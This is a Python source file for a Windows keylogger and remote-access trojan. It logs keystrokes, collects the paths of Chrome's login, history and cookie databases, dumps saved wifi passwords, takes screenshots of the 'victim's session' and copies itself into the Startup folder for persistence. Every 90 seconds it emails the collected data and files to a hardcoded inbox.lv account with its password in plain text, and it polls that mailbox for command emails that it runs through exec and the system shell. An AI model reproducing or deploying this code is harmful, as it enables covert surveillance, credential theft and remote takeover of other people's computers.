import smtplib
import imaplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from os import getcwd, path
from subprocess import check_output
from time import sleep
import pyscreeze

import keyboard

ID = 1
SENDING_INTERVAL = 90
SENDER = "cuij@inbox.lv"
RECEIVERS = ["cuij@inbox.lv"]
PASSWORD = "F9wQ!jHUp5"

global log
log = ""
typed_string = ""


def logprint(text, overwrite=False):
    global log
    print(text)
    if overwrite:
        log = text
    else:
        log += text


def on_press(event):
    global typed_string
    logprint(f"{event.time}:Key {event.name} pressed (Code:{event.scan_code})\n")
    event_dict = {"space": " ",
                  "enter": "\n",
                  "tab": "\t",
                  "backspace": "\b",
                  "unknown": f"[Code {event.scan_code}]"}
    if len(event.name) > 1:
        if event.name in event_dict.keys():
            name = event_dict[event.name]
        # elif event.name == "unknown":
        #    name = f"[Code {event.code}]"
        else:
            name = f"[{event.name.title()}]"
    else:
        name = event.name
        typed_string += f"{name}"


def get_chrome_data():
    '''Returns a list with the respective paths of the login, history and cookie SQL databases'''
    try:
        logprint("INFO: Attempting to retrieve chrome data...\n")
        data_path = path.expanduser('~').replace(
            "\\", '/') + "/AppData/Local/Google/Chrome/User Data/Default"
        login_db_path = path.join(data_path, 'Login Data')
        history_db_path = path.join(data_path, 'History')
        cookie_db_path = path.join(data_path, 'Cookies')
    except Exception as e:
        error_text = (
            f"ERROR: An error occured during retrieval. see traceback below:\n{type(e)}\n{str(e)}\n")
        logprint(error_text)
    else:
        logprint("INFO: Successfully retrieved chrome data.\n")
        return [login_db_path, history_db_path, cookie_db_path]


def get_wifi_data():
    ''' Returns a list of all known wifi credentials'''
    try:
        logprint("INFO: Attempting to retrieve wifi data...\n")
        data = check_output(['netsh', 'wlan', 'show', 'profiles'
                             ]).decode('utf-8',
                                       errors="backslashreplace").split('\n')
        profiles = [
            i.split(":")[1][1:-1] for i in data
            if "Profil Tous les utilisateurs" in i
        ]

        credentials_list = []
        for i in profiles:
            results = check_output([
                'netsh', 'wlan', 'show', 'profile', i, 'key=clear'
            ]).decode('utf-8', errors="backslashreplace").split('\n')
            results = [
                b.split(":")[1][1:-1] for b in results if "Contenu de la cl" in b
            ]

            credential_set = {"ESSID": "", "Key": ""}
            credential_set["ESSID"] = f"{i.strip()}"
            try:
                credential_set["Key"] = f"{results[0]}"
            except IndexError:
                credential_set["Key"] = "[Unknown]"
            finally:
                credentials_list.append(credential_set)
        file_path = "{}/wifi.json".format(
            path.expanduser('~').replace('\\', '/'))
        logprint(f"INFO: Writing data to {file_path}\n")
        with open(file_path, "w") as file:
            file.write(credentials_list)
    except Exception as e:
        error_text = (
            f"ERROR: An error occured during retrieval. see traceback below:\n{type(e)}\n{str(e)}\n")
        logprint(error_text)
    else:
        logprint("INFO: Successfully retrieved wifi data.\n")
        return [file_path]


def take_screenshot():
    '''Takes a screenshot of the victim's session and return its file path'''
    screenshot = pyscreeze.screenshot('ico.png')
    return [getcwd(screenshot)]


def make_persistent():
    '''Adds program to Startup Files, making it persist after reboots.'''
    logprint("INFO: Attempting to become persistent...")
    current_file_path = "{}/{}".format(getcwd().replace('\\',
                                       '/'), __file__)
    new_file_path = "{}/{}".format(path.expanduser('~').replace(
        '\\', '/'), "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
    try:
        command_output = check_output(
            f"cp {current_file_path} {new_file_path}")
    except:
        logprint("ERROR: cp command failed, see output below.")
        logprint(command_output)
        logprint("Warning: Persistence operation failed.")
    else:
        logprint("INFO: Successfully made program persistent")


def run_command_order(email_body):
    logprint(f"INFO: Command text is as follows, scraping:{email_body}\n")
    # Extract the list
    command_order = email_body.partition('[')
    command_order = command_order[2]
    command_order = command_order.partition(']')
    command_order = command_order[0]
    command_order = command_order.replace(
        '"', '').replace("=3D", "=").split(",")

    logprint(f"INFO: Command order is as follows, parsing:{command_order}")
    if command_order[0] == "script":
        logprint("INFO: Detected local command, running accordingly")
        results = str(exec(f"{command_order[1]}"))
    elif command_order[0] == "os":
        logprint("INFO: Detected global command, running accordingly")
        results = check_output(command_order[1].split()).decode(
            'utf-8', errors="backslashreplace")

    logprint("INFO: Ran given command, sending output.")
    send_results(
        message_text=f'Command order "{command_order}" outputed the following:\n{results}', subject=f"Command output from {ID}")


def send_results(message_text="", file_paths=None, subject=f"Report from {ID}"):
    print("INFO: Running sending check...")
    global log, typed_string
    if log != "" or message_text != "":
        logprint("INFO: New logs detected.")
        logprint("INFO: Generating e-mail report...")

        msg = MIMEMultipart()
        msg['From'] = SENDER
        msg['To'] = ",".join(RECEIVERS)
        msg['Subject'] = subject  # f"Report from {ID}"

        if message_text != "":
            body = message_text
        else:
            body = f"Report:\nLog (since last report):\n{log}\n\n\n\nTyped string(since program launch):\n{typed_string}\n\n\n\n{'Attached files' if file_paths else ''}."
        msg.attach(MIMEText(body, 'plain'))

        if file_paths:
            for file in file_paths:
                attachment = open(file, 'rb')
                p = MIMEBase('application', 'octet-stream')
                p.set_payload((attachment).read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition',
                             f'attachment; filename={file}')
                msg.attach(p)

        text = msg.as_string()
        logprint(
            f"INFO: Connecting to SMTP server, with username {SENDER} and PASSWORD {PASSWORD}.\n"
        )
        try:
            server = smtplib.SMTP_SSL('mail.inbox.lv', 465)
            server.login(SENDER, PASSWORD)
        except Exception as e:
            logprint(
                f"ERROR: Couldn't connect to server, see error traceback below\n{type(e)}\n{str(e)}\n"
            )
            logprint(f"ERROR: Mailing failed.\n")
        else:
            logprint(f"INFO: Successfully connected.\n")
            logprint(f"INFO: Sending from {SENDER} to {RECEIVERS}...\n")
            try:
                server.sendmail(SENDER, RECEIVERS, text)

            except Exception as e:
                logprint(
                    f"ERROR: Couldn't send mail, see error traceback below\n{type(e)}\n{str(e)}\n"
                )
                logprint(f"ERROR: Mailing failed.\n")
            else:
                logprint("INFO: Mailing successful.\n")
                server.quit()
                logprint('INFO: Cleared "log" variable.\n')
                logprint("", overwrite=True)
    else:
        print("INFO: No new keyboard input.\n")


def fetch_commands():
    print("INFO: Running new command check...\n")
    print(
        f"INFO: Connecting to IMAP server, with username {SENDER} and PASSWORD {PASSWORD}.\n"
    )
    try:
        server = imaplib.IMAP4_SSL("mail.inbox.lv", 993)
        server.login(SENDER, PASSWORD)
    except Exception as e:
        logprint(
            f"ERROR: Couldn't connect to IMAP server, see error traceback below\n{type(e)}\n{str(e)}\n"
        )
        logprint(f"ERROR: Check failed.\n")
    else:
        print(f"INFO: Successfully connected.\n")
        print(f"INFO: Fetching from {SENDER}...\n")
        try:
            server.select('INBOX')

            _, response = server.search(
                None, f'(FROM "{SENDER}" SUBJECT "Command for {ID}" UNSEEN)')
            unread_msg_nums = response[0].split()
            print(f"INFO: Found {len(unread_msg_nums)} new command emails\n")
            if len(unread_msg_nums) == 0:
                print("INFO: No commands to run\n")
            else:
                logprint("INFO: Running only first command\n")
                _, response = server.fetch(
                    unread_msg_nums[0], '(UID BODY[TEXT])')
                try:
                    run_command_order(response[0][1].decode("utf-8"))
                except Exception as e:
                    logprint(
                        f"ERROR: Couldn't execute mail, see error traceback below\n{type(e)}\n{str(e)}\n")
                else:
                    # Mark it as seen only if command succeeded
                    server.store(unread_msg_nums[0], '+FLAGS', '\Seen')

        except Exception as e:
            logprint(
                f"ERROR: Couldn't fetch and execute mail, see error traceback below\n{type(e)}\n{str(e)}\n"
            )
            logprint(f"ERROR: Check failed.\n")
        else:
            print("INFO: Check successful.\n")
            server.close()


keyboard.on_press(on_press)
while 1:
    fetch_commands()
    sleep(SENDING_INTERVAL)
    send_results()

